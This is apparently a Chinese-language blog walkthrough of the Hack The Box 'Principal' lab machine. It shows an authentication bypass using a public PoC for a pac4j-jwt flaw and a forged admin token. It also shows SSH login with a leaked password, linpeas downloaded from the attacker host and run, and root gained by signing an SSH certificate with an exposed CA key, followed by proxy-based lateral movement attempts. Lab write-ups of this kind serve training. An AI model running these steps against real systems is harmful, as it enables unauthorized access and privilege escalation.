---
title: Principal
date: 2026-06-28 20:51:59
categories:
  - prolabs
tags:
  - HTB
  - Prolab
  - Principal
  - 内网渗透
---
### 外网信息搜集

![image-20260628172015111](/images/prolabs/principal/20260628172022265.png)

 pac4j-jwt的版本是6.0.3

```
─(root㉿kali)-[~]
└─# curl -v http://10.129.244.220:8080                                       
*   Trying 10.129.244.220:8080...
* Established connection to 10.129.244.220 (10.129.244.220 port 8080) from 10.10.14.87 port 50008 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.129.244.220:8080
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Sun, 28 Jun 2026 09:36:48 GMT
< Server: Jetty
< X-Powered-By: pac4j-jwt/6.0.3
< Content-Language: en
< Location: /login
< Content-Length: 0
< 
* Connection #0 to host 10.129.244.220:8080 left intact
                                                         
```

### CVE-2026-29000

哪个 API 端点存储了公钥？

/api/auth/jwks

![image-20260628190219404](/images/prolabs/principal/20260628190219528.png)

```
{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"}]}
```

可确定对应漏洞为 CVE-2026-29000

下载对应poc

https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc

```
python3 poc.py \
--jwks http://10.129.244.220:8080/api/auth/jwks \
--user admin \
--role ROLE_ADMIN
```

![image-20260628191516974](/images/prolabs/principal/20260628191517037.png)

得到新token

浏览器控制台输入

```
sessionStorage.setItem("auth_token", "eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.ZN2E9-9GGEONWV6yj-krwT-f5pLHmVCRxwvc8FNRxuUtrruUIjh2spm3IaCW6WnqsJKs5aKhUCSt5ekbQQ_2lx3TeQgKsxjuvBgPZ2ZCul0EwuW70qlWINQBiQRTdNnHUvyWOmF1RBLryMNypaPo_T_OhEYsxjJU15l3puLkaNs6Au4_i0lIuYLv3CFU0XMSU9avtWMCOqPRZLdf4F9lV1mxeKLWjXaJ_8X83Mb7Y3G31r7GYT0oXQHVjWk1nP8t8pYbPfH0Ogdjy7T12qlPC6cqL5S9Sp6aT-DzSysLNaC13bizlIBguSF9JtxLOrlrEkHbPzHvlJdNryZvE__emA.-zu3hkXI1PfutJxg.3nsq405BvWfvkIKInj3kdpPmYiPQQkM7mbnFhm-K8vwZF-3ce_0xptMtrAEToT83YrYkZR-i5XP6eNGmsAtA0ZU_5uahM-LTCVulKWKneqau0QmoQbJFDubcASpLZU0thl1j4_cNI_h4mXzR01e6KHGnxn_i5gqKrOPgVhH-S9s1dm5BbMevSlQUSoTv_RgFtSLJwf6_iQAvcBf7G8De-agvQhWbsnvJBgg_dYlg3Fb9wde6HQ.x0fqv0zgClZeLKRgUc9suw")
```

![image-20260628192453712](/images/prolabs/principal/20260628192453779.png)

拿到任务五答案

网页应用程序中可以找到的明文密码是什么    D3pl0y_$$H_Now42!

哪位用户能够使用纯文本密码成功登录到 SSH？

svc-deploy

### 连接ssh

ssh连上找flag

```
ssh svc-deploy@10.129.244.220
```

![image-20260628193216655](/images/prolabs/principal/20260628193216700.png)

找到第一个flag

```
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
svc-deploy@principal:~$ 
```

接着进行提权

### 内网信息收集

先信息收集

```
whoami         
svc-deploy
id 
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
hostname
principal
uname -a
Linux principal 6.8.0-101-generic #101-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb  9 10:15:05 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux               
```

```
cat /etc/os-release
svc-deploy@principal:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
```

![image-20260628194623194](/images/prolabs/principal/20260628194623273.png)

#### 上传 linpeas 自动收集

```
cd /tmp
curl -O http://10.10.14.87/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /tmp/linpeas.txt
```

![image-20260628195213118](/images/prolabs/principal/20260628195213197.png)

部署者组对哪个目录有读取权限

找出所有属于 `deployers` 组的东西（文件+目录）

```
find / -group deployers -ls 2>/dev/null
```

![image-20260628200513526](/images/prolabs/principal/20260628200513562.png)

`deployers` 组恰好可以读 SSH 相关的配置和一个叫 `ca` 的文件，这极可能是 **SSH 证书授权（CA）的私钥**

答案是

```
/opt/principal/ssh
```

哪个文件中包含了针对 Principal 的自定义 sshd 配置？

```
/etc/ssh/sshd_config.d/60-principal.conf
```

```
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
svc-deploy@principal:~$ 
```

### 伪造ca证书提权

说明这台机器信任由 `/opt/principal/ssh/ca.pub` 这个 CA 签发的 SSH 用户证书。

确认/opt/principal/ssh/ca为私钥

在kali上准备一个root的密钥对

```
ssh-keygen -t ed25519 -f rootkey -N ''
```

把 `ca` 文件内容复制到攻击机保存为 `ca_key`

```
chmod 600 ca_key
ssh-keygen -s ca_key -I root_cert -n root -V +1d rootkey.pub
```

直接用证书登录root

```
ssh -i rootkey root@10.129.244.220
```

![image-20260628202307012](/images/prolabs/principal/20260628202307059.png)



至此到这里结束。后面瞎玩的

内网横向移动

简单配置socks代理

```
ssh -i rootkey -D 1080 root@10.129.244.220
```

这会在攻击机本地 `127.0.0.1:1080` 开一个 SOCKS5 代理，所有流量都通过靶机转发出去。

然后配置 `/etc/proxychains4.conf`（最后一行改为）：

```
socks5 127.0.0.1 1080
```

当前拿到的root的ip为10.129.244.220

扫描c段

![image-20260628203223317](/images/prolabs/principal/20260628203223362.png)

发现有四个主机存活

```
10.129.244.106

10.129.244.208

10.129.244.214

10.129.244.220 (这是我们已经拿下的 principal.htb)
```

先用之前的rootkey看能不能直接登录

```
ssh -i rootkey root@10.129.244.106
ssh -i rootkey root@10.129.244.208
ssh -i rootkey root@10.129.244.214
```

![image-20260628205137172](/images/prolabs/principal/20260628205137229.png)

别的靶场靶机